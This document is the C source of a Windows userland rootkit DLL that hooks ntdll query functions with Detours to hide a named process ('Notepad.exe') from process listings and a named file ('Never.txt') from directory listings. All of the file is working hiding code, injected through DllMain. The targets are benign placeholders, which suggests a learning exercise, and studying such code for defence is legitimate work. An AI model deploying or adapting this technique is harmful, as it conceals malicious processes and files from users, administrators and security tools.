#include <Windows.h>
#include <stdio.h>
#include "Structs.h"
#include "typedef.h"
#include "Debug.h"
#include "includes\detours\detours.h"

#pragma comment(lib, "includes\\detours\\detours.lib")

/* ------------------------------------------------------------------------------------------------------ */

fnNtQuerySystemInformation g_NtQuerySystemInformation;
fnNtQueryDirectoryFile g_NtQueryDirectoryFile;
fnRtlUnicodeStringToAnsiString g_RtlUnicodeStringToAnsiString;
fnNtQueryDirectoryFileEx g_NtQueryDirectoryFileEx;

/* ------------------------------------------------------------------------------------------------------ */

BOOL CompareToFileName(PFILE_ID_BOTH_DIR_INFO pFileIdBothDirInfo, const char* fileName) {

    ANSI_STRING as = { 0 };
    UNICODE_STRING EntryName = { 0 };
    EntryName.MaximumLength = EntryName.Length = (USHORT)pFileIdBothDirInfo->FileNameLength;
    EntryName.Buffer = &pFileIdBothDirInfo->FileName[0];
    g_RtlUnicodeStringToAnsiString(&as, &EntryName, TRUE);

    if (strcmp(as.Buffer, fileName) == 0) {
        return TRUE;
    }
    else {
        return FALSE;
    }

    return TRUE;
}

NTSTATUS MyNtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass, PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
    NTSTATUS stat = g_NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

    if (SystemInformationClass == SystemProcessInformation && stat == 0) {// Checks if current NtQuery is SystemProcessInformation

        PSYSTEM_PROCESS_INFORMATION Previous = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;
        PSYSTEM_PROCESS_INFORMATION Current = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)Previous + Previous->NextEntryOffset);

        while (Previous->NextEntryOffset != NULL) {
            if (!lstrcmp(Current->ImageName.Buffer, L"Notepad.exe")) {
                if (Current->NextEntryOffset == 0) {
                    Previous->NextEntryOffset = 0;
                }
                else {
                    Previous->NextEntryOffset += Current->NextEntryOffset;
                    PRINT("(+) NtQuerySystemInformation Used...\n");
                }
                Current = Previous;
            }

            Previous = Current;
            Current = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)Current + Current->NextEntryOffset);
        }
    }

    return stat;
}

NTSTATUS MyNtQueryDirectoryFile(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, BOOLEAN ReturnSingleEntry, PUNICODE_STRING FileName, BOOLEAN RestartScan) {
    NTSTATUS stat = g_NtQueryDirectoryFile(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, ReturnSingleEntry, FileName, RestartScan);

    PFILE_FULL_DIR_INFO pFileFullDirInfo;
    PFILE_FULL_DIR_INFO pFileBothDirInfo;

    if (FileInformationClass == FileFullDirectoryInformation) {
        pFileFullDirInfo = (PFILE_FULL_DIR_INFO)FileInformation;
        while (pFileFullDirInfo->NextEntryOffset) {
            pFileFullDirInfo = (PFILE_FULL_DIR_INFO)((LPBYTE)pFileFullDirInfo + pFileFullDirInfo->NextEntryOffset);
        }
    }
    else if (FileInformationClass == FileBothDirectoryInformation) {
        pFileBothDirInfo = (PFILE_FULL_DIR_INFO)FileInformation;
        while (pFileBothDirInfo->NextEntryOffset) {
            pFileBothDirInfo = (PFILE_FULL_DIR_INFO)((LPBYTE)pFileBothDirInfo + pFileBothDirInfo->NextEntryOffset);
        }
    }
    else if (FileInformationClass == FileIdBothDirectoryInformation) {
        PFILE_ID_BOTH_DIR_INFO current = (PFILE_ID_BOTH_DIR_INFO)FileInformation;

        while (current->NextEntryOffset) {
            PFILE_ID_BOTH_DIR_INFO next = (PFILE_ID_BOTH_DIR_INFO)((LPBYTE)current + current->NextEntryOffset);

            // comparing name
            if (CompareToFileName(next, "Never.txt") == TRUE) {
                if (next->NextEntryOffset != 0) {
                    next = (PFILE_ID_BOTH_DIR_INFO)((LPBYTE)next + next->NextEntryOffset);
                    current->NextEntryOffset += next->NextEntryOffset;
                    PRINT("(+) NtQueryDirectoryFile Used...\n");
                }
                else {
                    current->NextEntryOffset = 0;
                }
            }
            else {
                current = next;
            }
        }
    }
    return stat;
}

NTSTATUS MyNtQueryDirectoryFileEx(HANDLE FileHandle, HANDLE Event, PIO_APC_ROUTINE ApcRoutine, PVOID ApcContext, PIO_STATUS_BLOCK IoStatusBlock, PVOID FileInformation, ULONG Length, FILE_INFORMATION_CLASS FileInformationClass, ULONG QueryFlags, PUNICODE_STRING FileName) {
    NTSTATUS stat = g_NtQueryDirectoryFileEx(FileHandle, Event, ApcRoutine, ApcContext, IoStatusBlock, FileInformation, Length, FileInformationClass, QueryFlags, FileName);
    
    PFILE_FULL_DIR_INFO pFileFullDirInfo;
    PFILE_FULL_DIR_INFO pFileBothDirInfo;

    if (FileInformationClass == FileFullDirectoryInformation) {
        pFileFullDirInfo = (PFILE_FULL_DIR_INFO)FileInformation;
        while (pFileFullDirInfo->NextEntryOffset) {
            pFileFullDirInfo = (PFILE_FULL_DIR_INFO)((LPBYTE)pFileFullDirInfo + pFileFullDirInfo->NextEntryOffset);
        }
    }
    else if (FileInformationClass == FileBothDirectoryInformation) {
        pFileBothDirInfo = (PFILE_FULL_DIR_INFO)FileInformation;
        while (pFileBothDirInfo->NextEntryOffset) {
            pFileBothDirInfo = (PFILE_FULL_DIR_INFO)((LPBYTE)pFileBothDirInfo + pFileBothDirInfo->NextEntryOffset);
        }
    }
    else if (FileInformationClass == FileIdBothDirectoryInformation) {
        PFILE_ID_BOTH_DIR_INFO current = (PFILE_ID_BOTH_DIR_INFO)FileInformation;

        while (current->NextEntryOffset) {
            PFILE_ID_BOTH_DIR_INFO next = (PFILE_ID_BOTH_DIR_INFO)((LPBYTE)current + current->NextEntryOffset);

            // comparing name
            if (CompareToFileName(next, "Never.txt") == TRUE) {
                if (next->NextEntryOffset != 0) {
                    next = (PFILE_ID_BOTH_DIR_INFO)((LPBYTE)next + next->NextEntryOffset);
                    current->NextEntryOffset += next->NextEntryOffset;
                    PRINT("(+) NtQueryDirectoryFileEx Used...\n");
                }
                else {
                    current->NextEntryOffset = 0;
                }
            }
            else {
                current = next;
            }
        }
    }
    return stat;
}

/*----------------------------------------------------------------------------------------------------------*/

VOID InstallHook(LPCSTR dll, LPCSTR function, LPVOID* originalFunction, LPVOID hookedFunction) {

    *originalFunction = GetProcAddress(GetModuleHandleA(dll), function);
    if (*originalFunction)
        DetourAttach(originalFunction, hookedFunction);
    PRINT("(I) Hook Initiated...\n");

}

VOID Unhook(LPVOID* originalFunction, LPVOID hookedFunction) {

    if (*originalFunction)
        DetourDetach(originalFunction, hookedFunction);
    PRINT("(I) Hook Uninitiated...\n");
}

VOID InitializeHooks() {

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    InstallHook("ntdll.dll", "NtQuerySystemInformation", (LPVOID)&g_NtQuerySystemInformation, MyNtQuerySystemInformation);
    InstallHook("ntdll.dll", "NtQueryDirectoryFile", (LPVOID)&g_NtQueryDirectoryFile, MyNtQueryDirectoryFile);
    InstallHook("ntdll.dll", "NtQueryDirectoryFileEx", (LPVOID)&g_NtQueryDirectoryFileEx, MyNtQueryDirectoryFileEx);
    DetourTransactionCommit();
    PRINT("(I) NtQuerySystemInformation -> 0x%p\n(I) NtQueryDirectoryFile -> 0x%p\n", g_NtQuerySystemInformation, g_NtQueryDirectoryFile); 

}

VOID UninitializeHooks() {

    DetourTransactionBegin();
    DetourUpdateThread(GetCurrentThread());
    Unhook((LPVOID)&g_NtQuerySystemInformation, MyNtQuerySystemInformation);
    Unhook((LPVOID)&g_NtQueryDirectoryFile, MyNtQueryDirectoryFile);
    Unhook((LPVOID)&g_NtQueryDirectoryFileEx, MyNtQueryDirectoryFileEx);
    DetourTransactionCommit();

}

/*----------------------------------------------------------------------------------------------------------*/

BOOL WINAPI DllMain(HINSTANCE hModule, DWORD  fdwReason, LPVOID lpReserved) {

    g_RtlUnicodeStringToAnsiString = (fnRtlUnicodeStringToAnsiString)GetProcAddress(GetModuleHandle(TEXT("ntdll.dll")), "RtlUnicodeStringToAnsiString");

    if (fdwReason == DLL_PROCESS_ATTACH) {
#ifdef DEBUG
        CreateDebugConsole();
#endif
        InitializeHooks();
    }
    if (fdwReason == DLL_PROCESS_DETACH) {
        UninitializeHooks();
        PRINT("(-) Detaching Rootkit...\n");
    }

    return TRUE;
}

